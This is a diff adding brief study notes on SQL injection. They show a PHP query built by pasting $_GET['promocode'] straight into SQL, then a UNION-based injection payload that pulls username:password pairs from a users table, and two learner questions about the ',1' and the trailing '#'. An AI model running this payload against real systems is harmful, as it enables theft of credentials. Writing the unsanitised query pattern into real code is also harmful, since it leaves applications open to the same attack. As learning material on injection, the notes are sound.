@@ -1,0 +1,14 @@
+$sql = "SELECT discount, status FROM promocodes WHERE promocode='".$_GET['promocode']."';";
+' union all select concat(username,':',password),1 from fancydb.users#
+
+$sql = "SELECT discount, status FROM promocodes WHERE promocode='"' union all select concat(username,':',password),1 from fancydb.users#"';";
+
+
+
+
+"SELECT discount, status FROM promocodes WHERE promocode='"' union all select concat(username,':',password),1 from fancydb.users#"';";
+' union all select concat(username,':',password),1 from fancydb.users#
+
+question:
+Why is there ",1" after concat
+Why the doesnt work without trailing #
